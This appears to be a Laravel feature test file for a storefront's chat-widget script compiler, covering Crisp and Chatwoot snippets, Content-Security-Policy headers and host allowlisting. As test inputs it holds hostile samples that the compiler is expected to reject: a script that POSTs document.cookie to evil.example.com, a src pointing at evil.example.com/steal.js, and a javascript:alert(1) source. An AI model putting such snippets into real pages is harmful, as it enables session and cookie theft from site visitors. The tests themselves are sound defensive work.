<?php

namespace Tests\Feature;

use App\Models\User;
use App\Support\ServiceWidgetScript;
use App\Support\StorefrontConfig;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Spatie\Permission\Models\Role;
use Tests\TestCase;

class ServiceWidgetScriptTest extends TestCase
{
    use RefreshDatabase;

    public function test_crisp_install_code_is_served_as_same_origin_javascript(): void
    {
        StorefrontConfig::setMany([
            'service_widget' => [
                'enabled' => true,
                'links' => [],
                'script' => <<<'HTML'
<script type="text/javascript">window.$crisp=[];window.CRISP_WEBSITE_ID="site-id";(function(){var d=document;var s=d.createElement("script");s.src="https://client.crisp.chat/l.js";s.async=1;d.head.appendChild(s);})();</script>
HTML,
            ],
        ]);

        $settings = $this->getJson('/api/settings/storefront')->assertOk();
        $settings->assertJsonPath('service_widget.script_configured', true)
            ->assertJsonMissingPath('service_widget.script');

        $response = $this->get('/api/settings/service-widget.js')->assertOk()
            ->assertHeader('Content-Type', 'application/javascript; charset=UTF-8');

        $this->assertStringContainsString('window.CRISP_WEBSITE_ID="site-id"', $response->getContent());
        $this->assertStringNotContainsString('<script', $response->getContent());
        $this->assertStringContainsString('no-store', (string) $response->headers->get('Cache-Control'));
    }

    public function test_chatwoot_origin_is_added_to_storefront_csp_without_unsafe_inline_script(): void
    {
        StorefrontConfig::setMany([
            'service_widget' => [
                'enabled' => true,
                'links' => [],
                'script' => <<<'HTML'
<script>(function(d,t){var BASE_URL="https://chat.example.com";var g=d.createElement(t);g.src=BASE_URL+"/packs/js/sdk.js";g.onload=function(){window.chatwootSDK.run({websiteToken:"token",baseUrl:BASE_URL})};d.head.appendChild(g)})(document,"script");</script>
HTML,
            ],
            // 自建 Chatwoot 域名需显式加入白名单(安全审计 M2)。
            'service_widget_allowed_hosts' => ['chat.example.com', 'client.crisp.chat'],
        ]);

        $response = $this->get('/')->assertOk();
        $csp = (string) $response->headers->get('Content-Security-Policy');

        // 自建域名 + 默认官方域名(合并)都要放行;顺序不再断言(按字典序拼接)。
        $this->assertStringContainsString("script-src 'self'", $csp);
        $this->assertStringContainsString('https://chat.example.com', $csp);
        $this->assertStringContainsString('https://app.chatwoot.com', $csp);
        $this->assertStringContainsString('wss://client.relay.crisp.chat', $csp);
        $this->assertStringContainsString("frame-src 'self'", $csp);
        $this->assertStringNotContainsString("script-src 'self' 'unsafe-inline'", $csp);
    }

    public function test_external_script_tags_are_compiled_and_insecure_sources_are_ignored(): void
    {
        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script src="https://cdn.example.com/widget.js" async></script>'
                .'<script src="javascript:alert(1)"></script>',
        ], ['cdn.example.com']);

        $this->assertStringContainsString('https://cdn.example.com/widget.js', $compiled);
        $this->assertStringContainsString('s.async=true', $compiled);
        $this->assertStringNotContainsString('javascript:', $compiled);
    }

    public function test_external_script_src_outside_allowlist_is_dropped(): void
    {
        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script src="https://evil.example.com/steal.js"></script>',
        ]);

        $this->assertSame('', $compiled);
    }

    public function test_inline_body_referencing_disallowed_host_is_dropped(): void
    {
        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script>fetch("https://evil.example.com/x",{method:"POST",body:document.cookie})</script>',
        ]);

        $this->assertSame('', $compiled);
    }

    public function test_inline_body_with_http_url_is_dropped(): void
    {
        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script>var s=document.createElement("script");s.src="http://insecure.example.com/a.js"</script>',
        ], ['insecure.example.com']);

        $this->assertSame('', $compiled);
    }

    public function test_disabled_widget_returns_empty_script_and_does_not_relax_csp(): void
    {
        StorefrontConfig::setMany([
            'service_widget' => [
                'enabled' => false,
                'links' => [],
                'script' => '<script src="https://client.crisp.chat/l.js"></script>',
            ],
        ]);

        $this->get('/api/settings/service-widget.js')->assertOk()->assertContent('');

        $csp = (string) $this->get('/')->assertOk()->headers->get('Content-Security-Policy');
        $this->assertStringNotContainsString('client.crisp.chat', $csp);
    }

    public function test_chatwoot_official_snippet_compiles_with_default_hosts(): void
    {
        $widget = [
            'enabled' => true,
            'script' => <<<'HTML'
<script>
(function(d,t){var BASE_URL="https://app.chatwoot.com";var g=d.createElement(t),s=d.getElementsByTagName(t)[0];g.src=BASE_URL+"/packs/js/sdk.js";g.defer=true;g.async=true;g.onload=function(){window.chatwootSDK.run({websiteToken:'token',baseUrl:BASE_URL})};s.parentNode.insertBefore(g,s);})(document,"script");
</script>
HTML,
        ];

        $compiled = ServiceWidgetScript::compile($widget, null);
        $this->assertStringContainsString('chatwootSDK', $compiled);
    }

    public function test_dot_joined_hosts_and_stray_tokens_are_normalized(): void
    {
        // 用户误填:多个域名被点号连成一段 + 尾随逗号和残token('s')
        $raw = 'app.chatwoot.com.cdn.chatwoot.com.client.crisp.chat,s';

        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script src="https://app.chatwoot.com/packs/js/sdk.js"></script>',
        ], $raw);

        // 规范化后 app.chatwoot.com 被正确识别,脚本正常编译
        $this->assertStringContainsString('app.chatwoot.com/packs/js/sdk.js', $compiled);
    }

    public function test_whitespace_and_semicolon_separators_are_supported(): void
    {
        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script src="https://client.crisp.chat/l.js"></script>',
        ], "app.chatwoot.com; client.crisp.chat\ncdn.chatwoot.com");

        $this->assertStringContainsString('client.crisp.chat/l.js', $compiled);
    }

    public function test_scheme_and_path_are_stripped_from_allowlist_entries(): void
    {
        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script src="https://app.chatwoot.com/packs/js/sdk.js"></script>',
        ], 'https://app.chatwoot.com/, https://cdn.chatwoot.com/some/path');

        $this->assertStringContainsString('app.chatwoot.com/packs/js/sdk.js', $compiled);
    }

    public function test_all_invalid_entries_fall_back_to_defaults(): void
    {
        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script src="https://client.crisp.chat/l.js"></script>',
        ], 's, , 123, ,');

        // 非法条目全部剔除 → 回退默认官方域名 → crisp 正常编译
        $this->assertStringContainsString('client.crisp.chat/l.js', $compiled);
    }

    /**
     * 修复(2026-08-14):脚本被白名单整段丢弃时,script_configured 必须为 false,
     * 前台才会回退到链接浮窗模式,而不是进入原生模式加载空 JS 导致什么都不显示。
     */
    public function test_dropped_script_reports_not_configured_so_storefront_falls_back_to_links(): void
    {
        StorefrontConfig::setMany([
            'service_widget' => [
                'enabled' => true,
                'links' => [['label' => 'Telegram', 'url' => 'https://t.me/xxx']],
                // 网易七鱼域名不在默认白名单 → 编译结果为空
                'script' => '<script src="https://cdn.qiyukf.com/sdk/widget.js"></script>',
            ],
        ]);

        $settings = $this->getJson('/api/settings/storefront')->assertOk();
        $settings->assertJsonPath('service_widget.script_configured', false);

        $this->get('/api/settings/service-widget.js')->assertOk()->assertContent('');
    }

    /** 后台保存时,脚本非空但编译被丢弃 → 响应携带警示标记,前端提示补白名单。 */
    public function test_admin_settings_save_warns_when_script_dropped(): void
    {
        $admin = User::factory()->create();
        Role::firstOrCreate(['name' => 'super_admin']);
        $admin->assignRole('super_admin');

        $resp = $this->actingAs($admin, 'sanctum')->putJson('/api/admin/settings', [
            'settings' => [
                'service_widget' => [
                    'enabled' => true,
                    'links' => [],
                    'script' => '<script src="https://cdn.qiyukf.com/sdk/widget.js"></script>',
                ],
            ],
        ]);

        $resp->assertOk();
        $this->assertTrue((bool) $resp->json('service_widget_script_dropped'));

        // 白名单内脚本不触发警示
        $resp = $this->actingAs($admin, 'sanctum')->putJson('/api/admin/settings', [
            'settings' => [
                'service_widget_allowed_hosts' => 'cdn.qiyukf.com',
            ],
        ]);
        $resp->assertOk();
        $this->assertNull($resp->json('service_widget_script_dropped'));
    }

    /** CSP 必须放行白名单内的全部域名,即使它们没出现在安装代码文本里(Crisp 的 settings.crisp.chat 即典型)。 */
    public function test_csp_includes_all_allowlisted_hosts_even_if_not_in_snippet(): void
    {
        $widget = [
            'enabled' => true,
            'script' => '<script>(function(){var s=document.createElement("script");s.src="https://client.crisp.chat/l.js";document.head.appendChild(s)})()</script>',
        ];

        $origins = ServiceWidgetScript::allowedOrigins($widget, 'client.crisp.chat,settings.crisp.chat');

        $this->assertContains('https://client.crisp.chat', $origins);
        $this->assertContains('https://settings.crisp.chat', $origins);
    }

    /** 白名单只填主域名时,默认官方子域名也必须放行(SDK 运行期依赖)。 */
    public function test_default_provider_subdomains_always_allowed_in_csp(): void
    {
        $widget = [
            'enabled' => true,
            'script' => '<script>(function(){var s=document.createElement("script");s.src="https://client.crisp.chat/l.js";document.head.appendChild(s)})()</script>',
        ];

        $origins = ServiceWidgetScript::allowedOrigins($widget, 'client.crisp.chat');

        $this->assertContains('https://client.crisp.chat', $origins);
        $this->assertContains('https://settings.crisp.chat', $origins);
        $this->assertContains('https://app.chatwoot.com', $origins);
    }

    /** 白名单外的未知域名依然不进 CSP(收紧不放开)。 */
    public function test_untrusted_host_still_excluded_from_csp(): void
    {
        $widget = [
            'enabled' => true,
            'script' => '<script src="https://evil.example.com/x.js"></script>',
        ];

        $origins = ServiceWidgetScript::allowedOrigins($widget, 'client.crisp.chat');

        $this->assertNotContains('https://evil.example.com', $origins);
        $this->assertContains('https://client.crisp.chat', $origins);
    }
}
